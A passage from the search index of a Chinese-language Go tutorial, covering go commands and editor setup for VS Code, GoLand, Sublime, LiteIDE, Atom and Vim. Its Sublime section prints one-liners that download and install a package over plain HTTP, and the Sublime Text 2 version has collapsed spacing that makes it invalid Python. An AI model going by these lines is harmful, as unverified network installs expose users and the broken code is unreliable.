-http=:8080</code>\u3002\u7136\u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00<code>127.0.0.1:8080</code>\uff0c\u4f60\u5c06\u4f1a\u770b\u5230\u4e00\u4e2agolang.org\u7684\u672c\u5730copy\u7248\u672c\uff0c\u901a\u8fc7\u5b83\u4f60\u53ef\u4ee5\u67e5\u8be2pkg\u6587\u6863\u7b49\u5176\u5b83\u5185\u5bb9\u3002\u5982\u679c\u4f60\u8bbe\u7f6e\u4e86GOPATH\uff0c\u5728pkg\u5206\u7c7b\u4e0b\uff0c\u4e0d\u4f46\u4f1a\u5217\u51fa\u6807\u51c6\u5305\u7684\u6587\u6863\uff0c\u8fd8\u4f1a\u5217\u51fa\u4f60\u672c\u5730<code>GOPATH</code>\u4e2d\u6240\u6709\u9879\u76ee\u7684\u76f8\u5173\u6587\u6863\uff0c\u8fd9\u5bf9\u4e8e\u7ecf\u5e38\u88ab\u5899\u7684\u7528\u6237\u6765\u8bf4\u662f\u4e00\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002</p>"},{"location":"01.3/#_1","title":"\u5176\u5b83\u547d\u4ee4","text":"<p>go\u8fd8\u63d0\u4f9b\u4e86\u5176\u5b83\u5f88\u591a\u7684\u5de5\u5177\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u8fd9\u4e9b\u5de5\u5177</p> <pre><code>go version \u67e5\u770bgo\u5f53\u524d\u7684\u7248\u672c\ngo env \u67e5\u770b\u5f53\u524dgo\u7684\u73af\u5883\u53d8\u91cf\ngo list \u5217\u51fa\u5f53\u524d\u5168\u90e8\u5b89\u88c5\u7684package\ngo run \u7f16\u8bd1\u5e76\u8fd0\u884cGo\u7a0b\u5e8f\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u4e9b\u5de5\u5177\u8fd8\u6709\u5f88\u591a\u53c2\u6570\u6ca1\u6709\u4e00\u4e00\u4ecb\u7ecd\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528<code>go help \u547d\u4ee4</code>\u83b7\u53d6\u66f4\u8be6\u7ec6\u7684\u5e2e\u52a9\u4fe1\u606f\u3002</p>"},{"location":"01.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go Module, GOPATH\u4e0e\u5de5\u4f5c\u7a7a\u95f4</li> <li>\u4e0b\u4e00\u8282: Go\u5f00\u53d1\u5de5\u5177</li> </ul>"},{"location":"01.4/","title":"1.4 Go\u5f00\u53d1\u5de5\u5177","text":"<p>\u672c\u8282\u6211\u5c06\u4ecb\u7ecd\u51e0\u4e2a\u5f00\u53d1\u5de5\u5177\uff0c\u5b83\u4eec\u90fd\u5177\u6709\u81ea\u52a8\u5316\u8865\u5168\uff0c\u81ea\u52a8\u5316 fmt \u548c\u68c0\u67e5\u7b49\u529f\u80fd\u3002\u56e0\u4e3a\u5b83\u4eec\u90fd\u662f\u8de8\u5e73\u53f0\u7684\uff0c\u6240\u4ee5\u5b89\u88c5\u6b65\u9aa4\u4e4b\u7c7b\u7684\u90fd\u662f\u901a\u7528\u7684\u3002</p>"},{"location":"01.4/#visual-studio-code","title":"Visual Studio Code","text":"<p>Vscode \u662f\u5fae\u8f6f\u57fa\u4e8e Electron \u548c Web \u6280\u672f\u6784\u5efa\u7684\u5f00\u6e90\u7f16\u8f91\u5668, \u662f\u4e00\u6b3e\u975e\u5e38\u5f3a\u5927\u7684\u7f16\u8f91\u5668\u3002 \u800c\u4e14\u76ee\u524d vscode-go \u5df2\u5347\u7ea7\u4e3a Go \u5b98\u65b9\u7ef4\u62a4\u7684\u5de5\u5177, \u4e5f\u662f\u5f53\u524d\u514d\u8d39\u5f00\u6e90\u7684\u9996\u9009\u5f00\u53d1\u5de5\u5177.</p> <p>\u5f00\u6e90\u5730\u5740: https://github.com/Microsoft/vscode</p> <p>1\u3001\u5b89\u88c5Visual Studio Code \u6700\u65b0\u7248</p> <p>\u5b98\u65b9\u7f51\u7ad9\uff1ahttps://code.visualstudio.com \u4e0b\u8f7d Visual Studio Code \u6700\u65b0\u7248\uff0c\u5b89\u88c5\u8fc7\u7a0b\u7565\u3002</p> <p>2\u3001\u5b89\u88c5 Go \u63d2\u4ef6</p> <p>\u70b9\u51fb\u53f3\u8fb9\u7684 Extensions/\u6269\u5c55 \u56fe\u6807 \u641c\u7d22 <code>Go</code> \u63d2\u4ef6 \u5728\u63d2\u4ef6\u5217\u8868\u4e2d\uff0c\u9009\u62e9 Go\uff0c\u8fdb\u884c\u5b89\u88c5\uff0c\u5b89\u88c5\u4e4b\u540e\uff0c\u7cfb\u7edf\u4f1a\u63d0\u793a\u91cd\u542f Visual Studio Code\u3002</p> <p>\u5199\u4e00\u4e2a Hello World \uff0c\u7136\u540e\u8fd0\u884c:</p> <p>hello.go <pre><code>package main\n\nimport \"fmt\"\n\nfunc main() {\nfmt.Printf(\"Hello word\")\n}\n</code></pre></p> <p>\u4fdd\u5b58\u7684\u65f6\u5019, vscode \u53f3\u4e0b\u89d2\u4f1a\u63d0\u793a\uff0c\u9700\u8981\u5b89\u88c5\u4f9d\u8d56\u5305, \u70b9\u51fb Install All ( \u5efa\u8bae\u63d0\u524d\u8bbe\u597d\u4ee3\u7406, \u53c2\u8003 Go Module \u7ae0\u8282 ) \u53e6\u5916\u5efa\u8bae\u4f7f\u7528 golint \u6216\u8005 golangci-lint \u7b49\u5de5\u5177, \u53ef\u4ee5\u5199\u51fa\u66f4\u4f18\u96c5\u7684\u4ee3\u7801; \u4e5f\u53ef\u4ee5\u628a\u81ea\u52a8\u4fdd\u5b58\u529f\u80fd\u5f00\u542f, \u5f00\u542f\u65b9\u6cd5\u4e3a\uff1a\u9009\u62e9\u83dc\u5355 File\uff0c\u70b9\u51fb Auto save\u3002</p> <p>VSCode \u4ee3\u7801\u8bbe\u7f6e\u53ef\u7528\u4e8e Go \u6269\u5c55\u3002\u8fd9\u4e9b\u90fd\u53ef\u4ee5\u5728\u7528\u6237\u7684\u559c\u597d\u6765\u8bbe\u7f6e\u6216\u5de5\u4f5c\u533a\u8bbe\u7f6e\uff08.vscode/settings.json\uff09\u3002</p> <p>VSCode \u8fd8\u6709\u4e00\u4e9b\u9ad8\u7ea7\u914d\u7f6e, \u6253\u5f00\u9996\u9009\u9879-\u7528\u6237\u8bbe\u7f6e, \u4e00\u822c\u53ef\u4ee5\u901a\u8fc7\u56fe\u5f62\u754c\u9762\u8bbe\u7f6e \u4e5f\u53ef\u4ee5\u901a\u8fc7 settings.json \u8fdb\u884c\u66f4\u591a\u9ad8\u7ea7\u914d\u7f6e:</p> <pre><code>    \"go.buildOnSave\": \"package\",  // 'workspace', 'package', or 'off'.\n\"go.lintOnSave\": \"workspace\", // 'workspace', 'package', or 'off'.\n\"go.vetOnSave\": \"workspace\",  // 'workspace', 'package', or 'off'.\n\"go.buildFlags\": [],\n\"go.lintFlags\": [],\n\"go.vetFlags\": [],\n\"go.coverOnSave\": false,\n\"go.useCodeSnippetsOnFunctionSuggest\": false,\n\"go.formatOnSave\": true,\n// \n\"go.formatTool\": \"goimports\", // goreturns\n\"go.lintTool\": \"golangci-lint\",\n\"go.useLanguageServer\": true,\n// \n\"go.goroot\": \"\", // \u4f60\u7684 Goroot, \u53ef\u9009\u914d\u7f6e\n\"go.gopath\": \"\", // \u4f60\u7684 Gopath, go1.12 \u4e4b\u540e\u6539\u7528 go-mod, \u53ef\u9009\u914d\u7f6e\n</code></pre> <p>vscode \u8fd8\u6709\u4e00\u9879\u5f88\u5f3a\u5927\u7684\u529f\u80fd\u5c31\u662f\u65ad\u70b9\u8c03\u8bd5,\u7ed3\u5408 delve \u53ef\u4ee5\u5f88\u597d\u7684\u8fdb\u884c Go \u4ee3\u7801\u8c03\u8bd5</p> <pre><code>go get -v -u github.com/peterh/liner github.com/derekparker/delve/cmd/dlv\n\nbrew install go-delve/delve/delve (mac\u53ef\u9009)\n</code></pre> <p>\u5982\u679c\u6709\u95ee\u9898\u518d\u6765\u4e00\u904d: <pre><code>go get -v -u github.com/peterh/liner github.com/derekparker/delve/cmd/dlv\n</code></pre></p> <p>\u6ce8\u610f:\u4fee\u6539\"dlv-cert\"\u8bc1\u4e66, \u9009\u62e9\"\u663e\u793a\u7b80\u4ecb\"-&gt;\"\u4fe1\u4efb\"-&gt;\"\u4ee3\u7801\u7b7e\u540d\" \u4fee\u6539\u4e3a: \u59cb\u7ec8\u4fe1\u4efb</p> <p>\u6253\u5f00\u9996\u9009\u9879-\u5de5\u4f5c\u533a\u8bbe\u7f6e,\u914d\u7f6elaunch.json:</p> <pre><code>{\n\"version\": \"0.2.0\",\n\"configurations\": [\n{\n\"name\": \"main.go\",\n\"type\": \"go\",\n\"request\": \"launch\",\n\"mode\": \"debug\",\n\"remotePath\": \"\",\n\"port\": 2345,\n\"host\": \"127.0.0.1\",\n\"program\": \"${workspaceRoot}\", // \u5de5\u4f5c\u7a7a\u95f4\u8def\u5f84\n\"env\": {},\n\"args\": [],\n\"showLog\": true\n}\n]\n}\n</code></pre>"},{"location":"01.4/#goland","title":"GoLand","text":"<p>GoLand \u662f JetBrains \u516c\u53f8\u63a8\u51fa\u7684 Go \u8bed\u8a00\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff0c\u662f Idea Go \u63d2\u4ef6\u7684\u5f3a\u5316\u7248\u3002GoLand \u540c\u6837\u57fa\u4e8e IntelliJ \u5e73\u53f0\u5f00\u53d1\uff0c\u652f\u6301 JetBrains \u7684\u63d2\u4ef6\u4f53\u7cfb\u3002 \u7ecf\u8fc7\u51e0\u5e74\u4e0d\u65ad\u8fed\u4ee3\u66f4\u65b0, GoLand \u76ee\u524d\u5df2\u7ecf\u662f Go \u5f00\u53d1\u5de5\u5177\u4e2d\u6700\u6210\u719f\u7684 IDE \u4e4b\u4e00, \u800c\u4e14\u914d\u7f6e\u76f8\u5f53\u7b80\u5355.</p> <p>\u4e0b\u8f7d\u5730\u5740: https://www.jetbrains.com/go/</p>"},{"location":"01.4/#sublime-text","title":"Sublime Text","text":"<p>\u8fd9\u91cc\u5c06\u4ecb\u7ecdSublime Text 3\uff08\u4ee5\u4e0b\u7b80\u79f0Sublime\uff09+ GoSublime + gocode\u7684\u7ec4\u5408\uff0c\u90a3\u4e48\u4e3a\u4ec0\u4e48\u9009\u62e9\u8fd9\u4e2a\u7ec4\u5408\u5462\uff1f</p> <ul> <li> <p>\u81ea\u52a8\u5316\u63d0\u793a\u4ee3\u7801,\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u56fe1.5 sublime\u81ea\u52a8\u5316\u63d0\u793a\u754c\u9762</p> </li> <li> <p>\u4fdd\u5b58\u7684\u65f6\u5019\u81ea\u52a8\u683c\u5f0f\u5316\u4ee3\u7801\uff0c\u8ba9\u60a8\u7f16\u5199\u7684\u4ee3\u7801\u66f4\u52a0\u7f8e\u89c2\uff0c\u7b26\u5408Go\u7684\u6807\u51c6\u3002</p> </li> <li> <p>\u652f\u6301\u9879\u76ee\u7ba1\u7406</p> <p></p> <p>\u56fe1.6 sublime\u9879\u76ee\u7ba1\u7406\u754c\u9762</p> </li> <li> <p>\u652f\u6301\u8bed\u6cd5\u9ad8\u4eae</p> </li> <li>Sublime Text 3\u53ef\u514d\u8d39\u4f7f\u7528\uff0c\u53ea\u662f\u4fdd\u5b58\u6b21\u6570\u8fbe\u5230\u4e00\u5b9a\u6570\u91cf\u4e4b\u540e\u5c31\u4f1a\u63d0\u793a\u662f\u5426\u8d2d\u4e70\uff0c\u70b9\u51fb\u53d6\u6d88\u7ee7\u7eed\u7528\uff0c\u548c\u6b63\u5f0f\u6ce8\u518c\u7248\u672c\u6ca1\u6709\u4efb\u4f55\u533a\u522b\u3002</li> </ul> <p>\u63a5\u4e0b\u6765\u5c31\u5f00\u59cb\u8bb2\u5982\u4f55\u5b89\u88c5\uff0c\u4e0b\u8f7d Sublime</p> <p>\u6839\u636e\u81ea\u5df1\u76f8\u5e94\u7684\u7cfb\u7edf\u4e0b\u8f7d\u76f8\u5e94\u7684\u7248\u672c\uff0c\u7136\u540e\u6253\u5f00Sublime\uff0c\u5bf9\u4e8e\u4e0d\u719f\u6089Sublime\u7684\u540c\u5b66\u53ef\u4ee5\u5148\u770b\u4e00\u4e0b\u8fd9\u7bc7\u6587\u7ae0Sublime Text \u5168\u7a0b\u6307\u5357\u6216\u8005sublime text3\u5165\u95e8\u6559\u7a0b</p> <ol> <li>\u6253\u5f00\u4e4b\u540e\u5b89\u88c5 Package Control\uff1aCtrl+` \u6253\u5f00\u547d\u4ee4\u884c\uff0c\u6267\u884c\u5982\u4e0b\u4ee3\u7801\uff1a</li> </ol> <p>\u9002\u7528\u4e8e Sublime Text 3\uff1a</p> <p><pre><code>import  urllib.request,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();urllib.request.install_opener(urllib.request.build_opener(urllib.request.ProxyHandler()));open(os.path.join(ipp,pf),'wb').write(urllib.request.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read())\n</code></pre>   \u9002\u7528\u4e8e Sublime Text 2\uff1a</p> <pre><code>import  urllib2,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();os.makedirs(ipp)ifnotos.path.exists(ipp)elseNone;urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler()));open(os.path.join(ipp,pf),'wb').write(urllib2.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read());print('Please restart Sublime Text to finish installation')\n</code></pre> <p>\u8fd9\u4e2a\u65f6\u5019\u91cd\u542f\u4e00\u4e0bSublime\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u5728\u83dc\u5355\u680f\u591a\u4e86\u4e00\u4e2a\u5982\u4e0b\u7684\u680f\u76ee\uff0c\u8bf4\u660ePackage Control\u5df2\u7ecf\u5b89\u88c5\u6210\u529f\u4e86\u3002</p> <p></p> <pre><code>\u56fe1.7 sublime\u5305\u7ba1\u7406\n</code></pre> <ol> <li>\u5b89\u88c5\u5b8c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5Sublime\u7684\u63d2\u4ef6\u4e86\u3002\u9700\u5b89\u88c5GoSublime\u3001SidebarEnhancements\u548cGo Build\uff0c\u5b89\u88c5\u63d2\u4ef6\u4e4b\u540e\u8bb0\u5f97\u91cd\u542fSublime\u751f\u6548\uff0cCtrl+Shift+p\u6253\u5f00Package Controll \u8f93\u5165<code>pcip</code>\uff08\u5373\u201cPackage Control: Install Package\u201d\u7684\u7f29\u5199\uff09\u3002</li> </ol> <p>\u8fd9\u4e2a\u65f6\u5019\u770b\u5de6\u4e0b\u89d2\u663e\u793a\u6b63\u5728\u8bfb\u53d6\u5305\u6570\u636e\uff0c\u5b8c\u6210\u4e4b\u540e\u51fa\u73b0\u5982\u4e0b\u754c\u9762</p> <p></p> <pre><code>\u56fe1.8 sublime\u5b89\u88c5\u63d2\u4ef6\u754c\u9762\n</code></pre> <p>\u8fd9\u4e2a\u65f6\u5019\u8f93\u5165GoSublime\uff0c\u6309\u786e\u5b9a\u5c31\u5f00\u59cb\u5b89\u88c5\u4e86\u3002\u540c\u7406\u5e94\u7528\u4e8eSidebarEnhancements\u548cGo Build\u3002</p> <ol> <li> <p>\u5b89\u88c5 gocode</p> <pre><code>go get -u github.com/nsf/gocode\n</code></pre> <p>gocode \u5c06\u4f1a\u5b89\u88c5\u5728\u9ed8\u8ba4<code>$GOBIN</code></p> </li> </ol> <p>\u53e6\u5916\u5efa\u8bae\u5b89\u88c5gotests(\u751f\u6210\u6d4b\u8bd5\u4ee3\u7801):</p> <pre><code>\u5148\u5728sublime\u5b89\u88c5gotests\u63d2\u4ef6,\u518d\u8fd0\u884c:\n</code></pre> <pre><code>go get -u -v github.com/cweill/gotests/...\n</code></pre> <ol> <li>\u9a8c\u8bc1\u662f\u5426\u5b89\u88c5\u6210\u529f\uff0c\u4f60\u53ef\u4ee5\u6253\u5f00Sublime\uff0c\u6253\u5f00main.go\uff0c\u770b\u770b\u8bed\u6cd5\u662f\u4e0d\u662f\u9ad8\u4eae\u4e86\uff0c\u8f93\u5165<code>import</code>\u662f\u4e0d\u662f\u81ea\u52a8\u5316\u63d0\u793a\u4e86\uff0c<code>import \"fmt\"</code>\u4e4b\u540e\uff0c\u8f93\u5165<code>fmt.</code>\u662f\u4e0d\u662f\u81ea\u52a8\u5316\u63d0\u793a\u6709\u51fd\u6570\u4e86\u3002</li> </ol> <p>\u5982\u679c\u5df2\u7ecf\u51fa\u73b0\u8fd9\u4e2a\u63d0\u793a\uff0c\u90a3\u8bf4\u660e\u4f60\u5df2\u7ecf\u5b89\u88c5\u5b8c\u6210\u4e86\uff0c\u5e76\u4e14\u5b8c\u6210\u4e86\u81ea\u52a8\u63d0\u793a\u3002</p> <p>\u5982\u679c\u6ca1\u6709\u51fa\u73b0\u8fd9\u6837\u7684\u63d0\u793a\uff0c\u4e00\u822c\u5c31\u662f\u4f60\u7684<code>$PATH</code>\u6ca1\u6709\u914d\u7f6e\u6b63\u786e\u3002\u4f60\u53ef\u4ee5\u6253\u5f00\u7ec8\u7aef\uff0c\u8f93\u5165gocode\uff0c\u662f\u4e0d\u662f\u80fd\u591f\u6b63\u786e\u8fd0\u884c\uff0c\u5982\u679c\u4e0d\u884c\u5c31\u8bf4\u660e<code>$PATH</code>\u6ca1\u6709\u914d\u7f6e\u6b63\u786e\u3002   (\u9488\u5bf9XP)\u6709\u65f6\u5019\u5728\u7ec8\u7aef\u80fd\u8fd0\u884c\u6210\u529f,\u4f46sublime\u65e0\u63d0\u793a\u6216\u8005\u7f16\u8bd1\u89e3\u7801\u9519\u8bef,\u8bf7\u5b89\u88c5sublime text3\u548cconvert utf8\u63d2\u4ef6\u8bd5\u4e00\u8bd5</p> <ol> <li>MacOS\u4e0b\u5df2\u7ecf\u8bbe\u7f6e\u4e86$GOROOT, $GOPATH, $GOBIN\uff0c\u8fd8\u662f\u6ca1\u6709\u81ea\u52a8\u63d0\u793a\u600e\u4e48\u529e\u3002</li> </ol> <p>\u8bf7\u5728sublime\u4e2d\u4f7f\u7528command + 9\uff0c \u7136\u540e\u8f93\u5165env\u68c0\u67e5$PATH, GOROOT, $GOPATH, $GOBIN\u7b49\u53d8\u91cf\uff0c \u5982\u679c\u6ca1\u6709\u8bf7\u91c7\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u3002</p> <p>\u9996\u5148\u5efa\u7acb\u4e0b\u9762\u7684\u8fde\u63a5\uff0c \u7136\u540e\u4eceTerminal\u4e2d\u76f4\u63a5\u542f\u52a8sublime</p> <p>ln -s /Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl /usr/local/bin/sublime</p>"},{"location":"01.4/#liteide","title":"LiteIDE","text":"<p>LiteIDE\u662f\u4e00\u6b3e\u4e13\u95e8\u4e3aGo\u8bed\u8a00\u5f00\u53d1\u7684\u8de8\u5e73\u53f0\u8f7b\u91cf\u7ea7\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff08IDE\uff09\uff0c\u7531visualfc\u7f16\u5199\u3002</p> <p></p> <p>\u56fe1.4 LiteIDE\u4e3b\u754c\u9762</p> <p>LiteIDE\u4e3b\u8981\u7279\u70b9\uff1a</p> <ul> <li>\u652f\u6301\u4e3b\u6d41\u64cd\u4f5c\u7cfb\u7edf<ul> <li>Windows</li> <li>Linux</li> <li>MacOS X</li> </ul> </li> <li>Go\u7f16\u8bd1\u73af\u5883\u7ba1\u7406\u548c\u5207\u6362<ul> <li>\u7ba1\u7406\u548c\u5207\u6362\u591a\u4e2aGo\u7f16\u8bd1\u73af\u5883</li> <li>\u652f\u6301Go\u8bed\u8a00\u4ea4\u53c9\u7f16\u8bd1</li> </ul> </li> <li>\u4e0eGo\u6807\u51c6\u4e00\u81f4\u7684\u9879\u76ee\u7ba1\u7406\u65b9\u5f0f<ul> <li>\u57fa\u4e8eGOPATH\u7684\u5305\u6d4f\u89c8\u5668</li> <li>\u57fa\u4e8eGOPATH\u7684\u7f16\u8bd1\u7cfb\u7edf</li> <li>\u57fa\u4e8eGOPATH\u7684Api\u6587\u6863\u68c0\u7d22</li> </ul> </li> <li>Go\u8bed\u8a00\u7684\u7f16\u8f91\u652f\u6301<ul> <li>\u7c7b\u6d4f\u89c8\u5668\u548c\u5927\u7eb2\u663e\u793a</li> <li>Gocode(\u4ee3\u7801\u81ea\u52a8\u5b8c\u6210\u5de5\u5177)\u7684\u5b8c\u7f8e\u652f\u6301</li> <li>Go\u8bed\u8a00\u6587\u6863\u67e5\u770b\u548cApi\u5feb\u901f\u68c0\u7d22</li> <li>\u4ee3\u7801\u8868\u8fbe\u5f0f\u4fe1\u606f\u663e\u793a<code>F1</code></li> <li>\u6e90\u4ee3\u7801\u5b9a\u4e49\u8df3\u8f6c\u652f\u6301<code>F2</code></li> <li>Gdb\u65ad\u70b9\u548c\u8c03\u8bd5\u652f\u6301</li> <li>gofmt\u81ea\u52a8\u683c\u5f0f\u5316\u652f\u6301</li> </ul> </li> <li>\u5176\u4ed6\u7279\u5f81<ul> <li>\u652f\u6301\u591a\u56fd\u8bed\u8a00\u754c\u9762\u663e\u793a</li> <li>\u5b8c\u5168\u63d2\u4ef6\u4f53\u7cfb\u7ed3\u6784</li> <li>\u652f\u6301\u7f16\u8f91\u5668\u914d\u8272\u65b9\u6848</li> <li>\u57fa\u4e8eKate\u7684\u8bed\u6cd5\u663e\u793a\u652f\u6301</li> <li>\u57fa\u4e8e\u5168\u6587\u7684\u5355\u8bcd\u81ea\u52a8\u5b8c\u6210</li> <li>\u652f\u6301\u952e\u76d8\u5feb\u6377\u952e\u7ed1\u5b9a\u65b9\u6848</li> <li>Markdown\u6587\u6863\u7f16\u8f91\u652f\u6301<ul> <li>\u5b9e\u65f6\u9884\u89c8\u548c\u540c\u6b65\u663e\u793a</li> <li>\u81ea\u5b9a\u4e49CSS\u663e\u793a</li> <li>\u53ef\u5bfc\u51faHTML\u548cPDF\u6587\u6863</li> <li>\u6279\u91cf\u8f6c\u6362/\u5408\u5e76\u4e3aHTML/PDF\u6587\u6863</li> </ul> </li> </ul> </li> </ul> <p>LiteIDE\u5b89\u88c5\u914d\u7f6e</p> <ul> <li> <p>LiteIDE\u5b89\u88c5</p> <ul> <li>\u4e0b\u8f7d\u5730\u5740 http://sourceforge.net/projects/liteide/files</li> <li>\u6e90\u7801\u5730\u5740 https://github.com/visualfc/liteide</li> </ul> <p>\u9996\u5148\u5b89\u88c5\u597dGo\u8bed\u8a00\u73af\u5883\uff0c\u7136\u540e\u6839\u636e\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u8f7dLiteIDE\u5bf9\u5e94\u7684\u538b\u7f29\u6587\u4ef6\u76f4\u63a5\u89e3\u538b\u5373\u53ef\u4f7f\u7528\u3002</p> </li> <li> <p>\u7f16\u8bd1\u73af\u5883\u8bbe\u7f6e</p> <p>\u6839\u636e\u81ea\u8eab\u7cfb\u7edf\u8981\u6c42\u5207\u6362\u548c\u914d\u7f6eLiteIDE\u5f53\u524d\u4f7f\u7528\u7684\u73af\u5883\u53d8\u91cf\u3002</p> <p>\u4ee5Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c64\u4f4dGo\u8bed\u8a00\u4e3a\u4f8b\uff0c \u5de5\u5177\u680f\u7684\u73af\u5883\u914d\u7f6e\u4e2d\u9009\u62e9win64\uff0c\u70b9<code>\u7f16\u8f91\u73af\u5883</code>\uff0c\u8fdb\u5165LiteIDE\u7f16\u8f91win64.env\u6587\u4ef6</p> <pre><code>GOROOT=c:\\go\nGOBIN=\nGOARCH=amd64\nGOOS=windows\nCGO_ENABLED=1\n\nPATH=%GOBIN%;%GOROOT%\\bin;%PATH%\n\u3002\u3002\u3002\n</code></pre> <p>\u5c06\u5176\u4e2d\u7684<code>GOROOT=c:\\go</code>\u4fee\u6539\u4e3a\u5f53\u524dGo\u5b89\u88c5\u8def\u5f84\uff0c\u5b58\u76d8\u5373\u53ef\uff0c\u5982\u679c\u6709MinGW64\uff0c\u53ef\u4ee5\u5c06<code>c:\\MinGW64\\bin</code>\u52a0\u5165PATH\u4e2d\u4ee5\u4fbfgo\u8c03\u7528gcc\u652f\u6301CGO\u7f16\u8bd1\u3002</p> <p>\u4ee5Linux\u64cd\u4f5c\u7cfb\u7edf\uff0c64\u4f4dGo\u8bed\u8a00\u4e3a\u4f8b\uff0c \u5de5\u5177\u680f\u7684\u73af\u5883\u914d\u7f6e\u4e2d\u9009\u62e9linux64\uff0c\u70b9<code>\u7f16\u8f91\u73af\u5883</code>\uff0c\u8fdb\u5165LiteIDE\u7f16\u8f91linux64.env\u6587\u4ef6</p> <pre><code>GOROOT=$HOME/go\nGOBIN=\nGOARCH=amd64\nGOOS=linux\nCGO_ENABLED=1\n\nPATH=$GOBIN:$GOROOT/bin:$PATH\n\u3002\u3002\u3002\n</code></pre> <p>\u5c06\u5176\u4e2d\u7684<code>GOROOT=$HOME/go</code>\u4fee\u6539\u4e3a\u5f53\u524dGo\u5b89\u88c5\u8def\u5f84\uff0c\u5b58\u76d8\u5373\u53ef\u3002</p> </li> <li> <p>GOPATH\u8bbe\u7f6e</p> <p>Go\u8bed\u8a00\u7684\u5de5\u5177\u94fe\u4f7f\u7528GOPATH\u8bbe\u7f6e\uff0c\u662fGo\u8bed\u8a00\u5f00\u53d1\u7684\u9879\u76ee\u8def\u5f84\u5217\u8868\uff0c\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165(\u5728LiteIDE\u4e2d\u4e5f\u53ef\u4ee5<code>Ctrl+,</code>\u76f4\u63a5\u8f93\u5165)<code>go help gopath</code>\u5feb\u901f\u67e5\u770bGOPATH\u6587\u6863\u3002</p> <p>\u5728LiteIDE\u4e2d\u53ef\u4ee5\u65b9\u4fbf\u7684\u67e5\u770b\u548c\u8bbe\u7f6eGOPATH\u3002\u901a\u8fc7<code>\u83dc\u5355\uff0d\u67e5\u770b\uff0dGOPATH</code>\u8bbe\u7f6e\uff0c\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u4e2d\u5df2\u5b58\u5728\u7684GOPATH\u5217\u8868\uff0c \u540c\u65f6\u53ef\u6839\u636e\u9700\u8981\u6dfb\u52a0\u9879\u76ee\u76ee\u5f55\u5230\u81ea\u5b9a\u4e49GOPATH\u5217\u8868\u4e2d\u3002</p> </li> </ul>"},{"location":"01.4/#atom","title":"Atom","text":"<p>Atom \u662f GitHub \u57fa\u4e8e Electron \u548c Web \u6280\u672f\u6784\u5efa\u7684\u5f00\u6e90\u7f16\u8f91\u5668, \u662f\u4e00\u6b3e\u5f88\u6f02\u4eae\u5f3a\u5927\u7684\u7f16\u8f91\u5668, \u7f3a\u70b9\u662f\u901f\u5ea6\u6bd4\u8f83\u6162\u3002</p> <p>\u9996\u5148\u8981\u5148\u5b89\u88c5\u4e0b Atom\uff0c\u4e0b\u8f7d\u5730\u5740: https://atom.io/</p> <p>\u7136\u540e\u5b89\u88c5 go-plus \u63d2\u4ef6:</p> <pre><code>go-plus \u662f Atom \u4e0a\u9762\u7684\u4e00\u6b3e\u5f00\u6e90\u7684 go \u8bed\u8a00\u5f00\u53d1\u73af\u5883\u7684\u7684\u63d2\u4ef6\n</code></pre> <p>\u5b83\u9700\u8981\u4f9d\u8d56\u4e0b\u9762\u7684go\u8bed\u8a00\u5de5\u5177: <pre><code>1.autocomplete-go \uff1agocode\u7684\u4ee3\u7801\u81ea\u52a8\u63d0\u793a\n2.gofmt \uff1a\u4f7f\u7528goftm,goimports,goturns\n3.builder-go:go-install \u548cgo-test,\u9a8c\u8bc1\u4ee3\u7801\uff0c\u7ed9\u51fa\u5efa\u8bae\n4.gometalinet-linter:goline,vet,gotype\u7684\u68c0\u67e5\n5.navigator-godef:godef\n6.tester-goo :go test\n7.gorename :rename\n</code></pre> \u5728Atom\u4e2d\u7684 Preference \u4e2d\u53ef\u4ee5\u627e\u5230install\u83dc\u5355,\u8f93\u5165 go-plus,\u7136\u540e\u70b9\u51fb\u5b89\u88c5(install)</p> <p>\u5c31\u4f1a\u5f00\u59cb\u5b89\u88c5 go-plus \uff0c go-plus \u63d2\u4ef6\u4f1a\u81ea\u52a8\u5b89\u88c5\u5bf9\u5e94\u7684\u4f9d\u8d56\u63d2\u4ef6\uff0c\u5982\u679c\u6ca1\u6709\u5b89\u88c5\u5bf9\u5e94\u7684go\u7684\u7c7b\u5e93\u4f1a\u81ea\u52a8\u8fd0\u884c: go get \u5b89\u88c5\u3002</p>"},{"location":"01.4/#vim","title":"Vim","text":"<p>Vim\u662f\u4ecevi\u53d1\u5c55\u51fa\u6765\u7684\u4e00\u4e2a\u6587\u672c\u7f16\u8f91\u5668, \u4ee3\u7801\u8865\u5168\u3001\u7f16\u8bd1\u53ca\u9519\u8bef\u8df3\u8f6c\u7b49\u65b9\u4fbf\u7f16\u7a0b\u7684\u529f\u80fd\u7279\u522b\u4e30\u5bcc\uff0c\u5728\u7a0b\u5e8f\u5458\u4e2d\u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002</p> <p>vim-go\u662fvim\u4e0a\u9762\u7684\u4e00\u6b3e\u5f00\u6e90\u7684go\u8bed\u8a00\u4f7f\u7528\u6700\u4e3a\u5e7f\u6cdb\u5f00\u53d1\u73af\u5883\u7684\u7684\u63d2\u4ef6</p> <p>\u63d2\u4ef6\u5730\u5740\uff1agithub.com/fatih/vim-go</p> <p>vim\u7684\u63d2\u4ef6\u7ba1\u7406\u4e3b\u8981\u6709Pathogen\u4e0eVundle \uff0c\u4f46\u662f\u5176\u4f5c\u7528\u7684\u65b9\u9762\u4e0d\u540c\u3002 